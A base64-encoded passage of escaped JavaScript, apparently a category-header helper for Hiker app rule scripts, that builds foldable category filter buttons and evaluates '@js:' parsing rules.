lhaUgeyBjb2xfdHlwZTpcXFxcXFxcInRleHRfMVxcXFxcXFwiIH3vvIzpgqPmnIDnu4jnu5PmnpzlsLHmmK8geyB0aXRsZTpcXFxcXFxcIuagh+mimDFcXFxcXFxcIiwgdXJsOlxcXFxcXFwieHh4XFxcXFxcXCIsIGNvbF90eXBlOlxcXFxcXFwidGV4dF8xXFxcXFxcXCIgfVxcXFxuICAgICAqIEByZXR1cm5zIHtDYXRlZ29yaWVzSGVhZGVyfVxcXFxuICAgICAqL1xcXFxuICAgIGZvbGRMYXlvdXQobGF5b3V0KSB7XFxcXG4gICAgICAgIGlmICh0eXBlb2YgbGF5b3V0ID09PSAnb2JqZWN0Jykge1xcXFxuICAgICAgICAgICAgbGV0IGtleXMgPSBPYmplY3Qua2V5cyhsYXlvdXQpXFxcXG4gICAgICAgICAgICBsZXQgaW5qZWN0SW5kZXggPSBsYXlvdXQuaW5qZWN0SW5kZXggfHwgbGF5b3V0Wyfmipjlj6DmjInpkq7mj5LlhaXooYwnXVxcXFxuICAgICAgICAgICAgaWYgKGxheW91dC50aXRsZSB8fCBsYXlvdXQudXJsIHx8IGxheW91dC5jb2xfdHlwZSB8fCBpbmplY3RJbmRleCkge1xcXFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwga2V5cy5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBrZXlzW2ldXFxcXG4gICAgICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XVtrZXldID0gbGF5b3V0W2tleV07XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7fkvKDlhaXmraPnoa7nmoTmipjlj6DnlYzpnaLlhYPntKDvvIFcXFxcXFxcIilcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIC8vIGluamVjdEluZGV4IOaKmOWPoOaMiemSruaPkuWFpeesrCBpbmplY3RJbmRleCDooYxcXFxcbiAgICAgICAgICAgIGlmIChpbmplY3RJbmRleCkge1xcXFxuICAgICAgICAgICAgICAgIGlmICghKHR5cGVvZiAoaW5qZWN0SW5kZXgpID09PSAnbnVtYmVyJykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi5oqY5Y+g5oyJ6ZKu5o+S5YWl6KGM6K+35Lyg5YWl5pWw5a2X77yBXFxcXFxcXCIpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmIChpbmplY3RJbmRleCA8IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi5oqY5Y+g5oyJ6ZKu5o+S5YWl6KGM6K+35Lyg5YWl5aSn5LqOIDAg55qE5pW05pWw77yBXFxcXFxcXCIpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmIChpbmplY3RJbmRleCA+IHRoaXNbc3ltYm9sTWFwLm1Gb2xkSW5kZXhdKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuaKmOWPoOaMiemSruaPkuWFpeihjOS4jeW+l+Wkp+S6juaYvuekuuaKmOWPoOihjOaVsO+8geivt+iwg+eUqCAuZm9sZEluZGV4KGluZGV4KSDmiJYgLuesrOWHoOihjOW8gOWni+aKmOWPoChpbmRleCkg5Lyg5YWl5q2j56Gu55qE5pi+56S65oqY5Y+g6KGM5pWwXFxcXFxcXCIpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS5pbmplY3RJbmRleCA9IGluamVjdEluZGV4IHx8IDE7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7fkvKDlhaXmraPnoa7nmoTmipjlj6DnlYzpnaLlhYPntKDvvIFcXFxcXFxcIilcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gdGhpcztcXFxcbiAgICB9LFxcXFxuICAgIC8vIOW9k+WJjeaYr+WQpuaKmOWPoFxcXFxuICAgIGZvbGQoaXNGb2xkKSB7XFxcXG4gICAgICAgIGlmICh0eXBlb2YgKGlzRm9sZCkgPT09ICdzdHJpbmcnKSB7XFxcXG4gICAgICAgICAgICBpc0ZvbGQgPSBpc0ZvbGQgPT09ICcxJ1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpc0ZvbGQpIHtcXFxcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkXSA9ICcxJztcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkXSA9ICcwJztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gdGhpc1xcXFxuICAgIH0sXFxcXG4gICAgY29sb3IobUNvbG9yKSB7XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Db2xvcl0gPSBtQ29sb3JcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIHRhZyhtVGFnKSB7XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1UYWddID0gbVRhZ1xcXFxuICAgICAgICByZXR1cm4gdGhpc1xcXFxuICAgIH0sXFxcXG4gICAgYWRkKHJ1bGVPYmopIHtcXFxcbiAgICAgICAgLy8gbG9nKCQuc3RyaW5naWZ5KHJ1bGVPYmopKVxcXFxuICAgICAgICBpZiAocnVsZU9iai5jb25zdHJ1Y3RvciA9PT0gQXJyYXkpIHtcXFxcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XSA9IHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XS5jb25jYXQocnVsZU9iailcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XS5wdXNoKHJ1bGVPYmopXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIHRoaXM7XFxcXG4gICAgfSxcXFxcbiAgICBldmFsSlNSdWxlKGl0ZW0sIGpzUnVsZSkge1xcXFxuICAgICAgICBsZXQgcnVsZSA9IGpzUnVsZS5yZXBsYWNlKFxcXFxcXFwiQGpzOlxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKVxcXFxuICAgICAgICBydWxlID0gcnVsZS50cmltKClcXFxcbiAgICAgICAgLy8gbG9nKCQuc3RyaW5naWZ5KHJ1bGUpKVxcXFxuICAgICAgICBsZXQgaW5wdXQgPSBpdGVtXFxcXG4gICAgICAgIGlmIChydWxlLnN0YXJ0c1dpdGgoXFxcXFxcXCIoXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgcnVsZSlcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIC8qKlxcXFxuICAgICAgICAgICAgICog6L+Y5Y6f5oiQICQudG9TdHJpbmcoLi4uKSDnmoTmnIDnu4jnu5PmnpzvvIzovr7liLDmnIDnu4jlpITnkIbmlrnlvI/ot5/kuIrpnaLnmoQgaWYg5LiA6Ie055qE55uu55qEXFxcXG4gICAgICAgICAgICAgKi9cXFxcbiAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyAnKCgpID0+IHsnICsgcnVsZSArICd9KSgpJylcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gKHJlc3VsdCB8fCAnJylcXFxcbiAgICB9LFxcXFxuICAgIGdldFRpdGxlKHNyYywgY2F0ZWdvcnkpIHtcXFxcbiAgICAgICAgbGV0IHRpdGxlID0gJydcXFxcbiAgICAgICAgbGV0IHRpdGxlUnVsZSA9IGNhdGVnb3J5LnRpdGxlUnVsZSB8fCAnYSYmVGV4dCdcXFxcbiAgICAgICAgaWYgKHRpdGxlUnVsZS5zdGFydHNXaXRoKFxcXFxcXFwiQGpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgdGl0bGUgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCB0aXRsZVJ1bGUpXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICB0aXRsZSA9IHBhcnNlRG9tRm9ySHRtbChzcmMsIHRpdGxlUnVsZSlcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gdGl0bGUgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICB9LFxcXFxuICAgIGdldFVybChzcmMsIGNhdGVnb3J5KSB7XFxcXG4gICAgICAgIGxldCB1cmwgPSAnJ1xcXFxuICAgICAgICBsZXQgdXJsUnVsZSA9IGNhdGVnb3J5LnVybFJ1bGUgfHwgJ2EmJmhyZWYnXFxcXG4gICAgICAgIGlmICh0eXBlb2YgdXJsUnVsZSA9PT0gJ29iamVjdCcpIHtcXFxcbiAgICAgICAgICAgIGxldCBtVXJsUnVsZSA9IHVybFJ1bGUucnVsZSB8fCB1cmxSdWxlWyfop6PmnpDop4TliJknXSB8fCAnYSYmaHJlZic7XFxcXG4gICAgICAgICAgICBpZiAobVVybFJ1bGUuc3RhcnRzV2l0aChcXFxcXFxcIkBqczpcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICB1cmwgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCBtVXJsUnVsZSk7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIGxldCBwYXJzZSA9IHBhcnNlRG9tO1xcXFxuICAgICAgICAgICAgICAgIGlmICh1cmxSdWxlLnBhcnNlT3B0aW9uKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAodXJsUnVsZS5wYXJzZU9wdGlvbikge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFxcXFxcInBhcnNlRG9tXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXFxcXFwicGRcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZSA9IHBhcnNlRG9tO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFxcXFxcInBhcnNlRG9tRm9ySHRtbFxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFxcXFxcInBkZmhcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZSA9IHBhcnNlRG9tRm9ySHRtbDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2UgPSBwYXJzZURvbTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodXJsUnVsZVtcXFxcXFxcIuino+aekOaWueazlVxcXFxcXFwiXSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKHVybFJ1bGVbXFxcXFxcXCLop6PmnpDmlrnms5VcXFxcXFxcIl0pIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcXFxcXCJwYXJzZURvbVxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFxcXFxcInBkXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2UgPSBwYXJzZURvbTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcXFxcXCJwYXJzZURvbUZvckh0bWxcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcXFxcXCJwZGZoXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2UgPSBwYXJzZURvbUZvckh0bWw7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0OlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlID0gcGFyc2VEb207XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgdXJsID0gcGFyc2Uoc3JjLCBtVXJsUnVsZSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBpZiAodXJsUnVsZS5kZWFsVXJsKSB7XFxcXG4gICAgICAgICAgICAgICAgdXJsID0gdXJsUnVsZS5kZWFsVXJsKHVybClcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAodXJsUnVsZVsn5LqM5qyh5aSE55CGJ10pIHtcXFxcbiAgICAgICAgICAgICAgICB1cmwgPSB1cmxSdWxlWyfkuozmrKHlpITnkIYnXSh1cmwpXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICBpZiAodXJsUnVsZS5zdGFydHNXaXRoKFxcXFxcXFwiQGpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgICAgIHVybCA9IHRoaXMuZXZhbEpTUnVsZShzcmMsIHVybFJ1bGUpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZURvbShzcmMsIHVybFJ1bGUpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiB1cmwgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICB9LFxcXFxuICAgIGJ1aWxkKCkge1xcXFxuICAgICAgICAvLyDmo4DmtYvmmK/lkKbkvKDlhaXpnIDopoHnmoTlj4LmlbBcXFxcbiAgICAgICAgdGhpcy5jaGVja1BhcmFtcygpXFxcXG4gICAgICAgIC8vIOavj+S4gOS4quWIhuexu+eahOWUr+S4gOagh+ivhlxcXFxuICAgICAgICBsZXQgbVRhZyA9IHRoaXNbc3ltYm9sTWFwLm1UYWddIHx8IFxcXFxcXFwiXFxcXFxcXCJcXFxcbiAgICAgICAgLy/nv7vpobUg6ZyA6KaB5qC55o2u5a6e6ZmF5pu/5o2iXFxcXG4gICAgICAgIGNvbnN0IGh0bWwgPSB0aGlzW3N5bWJvbE1hcC5zcmNdIHx8IHJlcXVlc3QodGhpc1tzeW1ib2xNYXAudHJ1ZV91cmxdKVxcXFxuICAgICAgICBjb25zdCBlbXB0eSA9IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgIC8v6I635Y+W5YiX6KGoXFxcXG4gICAgICAgIGNvbnN0IGNhdGVnb3JpZXMgPSBbXVxcXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0ubWFwKHJ1bGVPYmogPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGxpc3QgPSBbXVxcXFxuICAgICAgICAgICAgbGV0IGxpc3RSdWxlID0gcnVsZU9iai5saXN0UnVsZSB8fCBydWxlT2JqW1xcXFxcXFwi5LiA57qn5YiG57G7XFxcXFxcXCJdXFxcXG4gICAgICAgICAgICBpZiAobGlzdFJ1bGUuc3RhcnRzV2l0aChcXFxcXFxcIkBqczpcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICAvLyBsb2coJC5zdHJpbmdpZnkobGlzdFJ1bGUpKVxcXFxuICAgICAgICAgICAgICAgIGxpc3QgPSB0aGlzLmV2YWxKU1J1bGUoaHRtbCwgbGlzdFJ1bGUpXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGh0bWwsIGxpc3RSdWxlKVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgLy8gbG9nKGxpc3QpXFxcXG4gICAgICAgICAgICBsaXN0Lm1hcChjYXRlZ29yeSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY2F0ZWdvcmllcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGlzdDogY2F0ZWdvcnksXFxcXG4gICAgICAgICAgICAgICAgICAgIHN1Ykxpc3RSdWxlOiBydWxlT2JqLnN1Ykxpc3RSdWxlIHx8IHJ1bGVPYmpbXFxcXFxcXCLlrZDliIbnsbtcXFxcXFxcIl0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlUnVsZTogcnVsZU9iai50aXRsZVJ1bGUgfHwgcnVsZU9ialtcXFxcXFxcIuWIhuexu+agh+mimFxcXFxcXFwiXSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsUnVsZTogcnVsZU9iai51cmxSdWxlIHx8IHJ1bGVPYmpbXFxcXFxcXCLliIbnsbvpk77mjqVcXFxcXFxcIl0sXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KVxcXFxuXFxcXG4gICAgICAgIC8vIGxvZygkLnN0cmluZ2lmeShjYXRlZ29yaWVzKSlcXFxcblxcXFxuICAgICAgICBsZXQgaW5pdF9jYXRlID0gW11cXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAyMDsgaSsrKSB7XFxcXG4gICAgICAgICAgICBpbml0X2NhdGUucHVzaChcXFxcXFxcIjBcXFxcXFxcIilcXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgIGNvbnN0IGNhdGVfdGVtcF9qc29uID0gZ2V0TXlWYXIobVRhZyArIHRoaXMuVkFSTUFQLkNBVEVHT1JZLCBKU09OLnN0cmluZ2lmeShpbml0X2NhdGUpKVxcXFxuICAgICAgICBjb25zdCBjYXRlX3RlbXAgPSBKU09OLnBhcnNlKGNhdGVfdGVtcF9qc29uKVxcXFxuXFxcXG4gICAgICAgIGlmICh0aGlzW3N5bWJvbE1hcC5tUGFnZV0gPT09IDEpIHtcXFxcblxcXFxuICAgICAgICAgICAgY2F0ZWdvcmllcy5mb3JFYWNoKChjYXRlZ29yeSwgaW5kZXgpID0+IHtcXFxcblxcXFxuICAgICAgICAgICAgICAgIC8vIOaKmOWPoCBVSVxcXFxuICAgICAgICAgICAgICAgIGlmICh0aGlzW3N5bWJvbE1hcC5tRm9sZElubmVyRW5hYmxlXSAmJiB0aGlzW3N5bWJvbE1hcC5tRm9sZExheW91dF0uaW5qZWN0SW5kZXggPT09IChpbmRleCsxKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgZm9sZExheW91dCA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aGlzW3N5bWJvbE1hcC5tRm9sZExheW91dF0udGl0bGUgfHwgKHRoaXNbc3ltYm9sTWFwLm1Gb2xkXSA9PT0gJzEnID8gJ+KAnOKAnOKAneKAnTxiPjxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6ICNGRjAwMDBcXFxcXFxcIj7iiKg8L3NwYW4+PC9iPicgOiAn4oCc4oCc4oCd4oCdPGI+PHNwYW4gc3R5bGU9XFxcXFxcXCJjb2xvcjogIzFhYWQxOVxcXFxcXFwiPuKIpzwvc3Bhbj48L2I+JyksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS51cmwgfHwgJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5I1xcXFxcXFwiKS5sYXp5UnVsZSgocGFyYW1zKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLm1UYWcgKyBwYXJhbXMuVkFSTUFQLkZPTEQsIGdldE15VmFyKHBhcmFtcy5tVGFnICsgcGFyYW1zLlZBUk1BUC5GT0xELCBwYXJhbXMuaXNGb2xkKSA9PT0gJzEnID8gJzAnIDogJzEnKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtVGFnOiBtVGFnLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzRm9sZDogdGhpc1tzeW1ib2xNYXAubUZvbGRdLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZBUk1BUDogdGhpcy5WQVJNQVBcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS5jb2xfdHlwZSB8fCBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tTGF5b3V0XS5wdXNoKGZvbGRMYXlvdXQpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgLy/lhbfkvZPliJfooajkuIvnmoTliIbnsbtcXFxcbiAgICAgICAgICAgICAgICBsZXQgc3ViX2NhdGVnb3JpZXMgPSBbXTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoY2F0ZWdvcnkuc3ViTGlzdFJ1bGUuc3RhcnRzV2l0aChcXFxcXFxcIkBqczpcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMgPSB0aGlzLmV2YWxKU1J1bGUoY2F0ZWdvcnkubGlzdCwgY2F0ZWdvcnkuc3ViTGlzdFJ1bGUpXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMgPSBwYXJzZURvbUZvckFycmF5KGNhdGVnb3J5Lmxpc3QsIGNhdGVnb3J5LnN1Ykxpc3RSdWxlKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKGluZGV4IDwgKHRoaXNbc3ltYm9sTWFwLm1Gb2xkSW5kZXhdIHx8IDEpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzLmZvckVhY2goKGl0ZW0sIGtleSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gdGhpcy5nZXRUaXRsZShpdGVtLCBjYXRlZ29yeSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB1cmwgPSB0aGlzLmdldFVybChpdGVtLCBjYXRlZ29yeSlcXFxcblxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpc1tzeW1ib2xNYXAubUxheW91dF0ucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGtleS50b1N0cmluZygpID09PSBjYXRlX3RlbXBbaW5kZXhdID8gJ+KAnOKAnOKAneKAnTxiPjxmb250IGNvbG9yPScgKyB0aGlzW3N5bWJvbE1hcC5tQ29sb3JdICsgJz4nICsgdGl0bGUgKyAnIDwvZm9udD48L2I+JyA6IHRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogJCh1cmwpLmxhenlSdWxlKChwYXJhbXMpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG5ld19jYXRlID0gW11cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5pbmRleCA9PT0gMCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcC5mb3JFYWNoKChjYXRlLCBpbmRleCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld19jYXRlLnB1c2goaW5kZXggPT09IDAgPyBwYXJhbXMua2V5LnRvU3RyaW5nKCkgOiBcXFxcXFxcIjBcXFxcXFxcIilcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLnRhZyArIHBhcmFtcy5WQVJNQVAuQ0FURUdPUlksIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5pbmRleCA9PT0gMCA/IG5ld19jYXRlIDogcGFyYW1zLmNhdGVfdGVtcCkpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHBhcmFtcy50YWcgKyBwYXJhbXMuVkFSTUFQLlVSTCwgaW5wdXQpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0ZV90ZW1wOiBjYXRlX3RlbXAsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZGV4OiBpbmRleCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVkFSTUFQOiB0aGlzLlZBUk1BUCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnOiBtVGFnLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk6IGtleSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZTogdGhpc1tzeW1ib2xNYXAubVBhZ2VdLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tTGF5b3V0XS5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICh0aGlzW3N5bWJvbE1hcC5tRm9sZF0gPT09ICcwJykge1xcXFxuICAgICAgICAgICAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IHRoaXMuZ2V0VGl0bGUoaXRlbSwgY2F0ZWdvcnkpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdXJsID0gdGhpcy5nZXRVcmwoaXRlbSwgY2F0ZWdvcnkpXFxcXG5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBrZXkudG9TdHJpbmcoKSA9PT0gY2F0ZV90ZW1wW2luZGV4XSA/ICfigJzigJzigJ3igJ08Yj48Zm9udCBjb2xvcj0nICsgdGhpc1tzeW1ib2xNYXAubUNvbG9yXSArICc+JyArIHRpdGxlICsgJyA8L2ZvbnQ+PC9iPicgOiB0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICQodXJsKS5sYXp5UnVsZSgocGFyYW1zKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtcy5jYXRlX3RlbXBbcGFyYW1zLmluZGV4XSA9IHBhcmFtcy5rZXkudG9TdH